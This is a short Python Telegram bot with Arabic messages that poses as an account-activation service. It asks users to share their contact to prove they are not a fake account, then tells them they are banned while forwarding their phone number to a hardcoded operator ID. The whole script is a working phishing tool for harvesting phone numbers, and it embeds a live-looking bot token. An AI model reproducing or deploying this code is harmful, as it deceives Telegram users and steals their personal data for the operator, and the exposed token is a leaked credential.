import telebot
from telebot import types
token = "6513609558:AAG1SQkdDOHQMtF-N1DPR0wVOCxB7RYWMdk"
bot = telebot.TeleBot(token)
sudo = "6016635320"
@bot.message_handler(commands=['start']) 
def start(message):
    url='https://telegra.ph/file/50a0f803211ec3c87e03f.jpg'
    bot.send_photo(message.chat.id,url,caption="مرحبا انا بوت اقوم بتفعيل حساب التليجرام \n يرجي تسجيل الدخول بالحساب المراد تفعيله ارسل /done")
@bot.message_handler(commands=['done'])
def register(message):
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True)
    contact = types.KeyboardButton(text="- تأكيد ", request_contact=True)
    keyboard.row_width = 1
    keyboard.add(contact)
    response = bot.send_message(message.chat.id, 
                                "<strong>المعذره عزيزي! \n لم يتم احتساب النقاط يجب التأكد انك لست حساب وهمي! </strong>",parse_mode="html",reply_markup=keyboard) 
@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    bot.send_message(message.chat.id,f"<strong>تم حظرك من البوت لأنك تستخدم رقم غير صحيح </strong>",parse_mode="html")
    c = message.contact.phone_number
    bot.forward_message(sudo,message.chat.id,message.message_id)
name = "main"
if name == 'main':
    bot.polling(none_stop=True)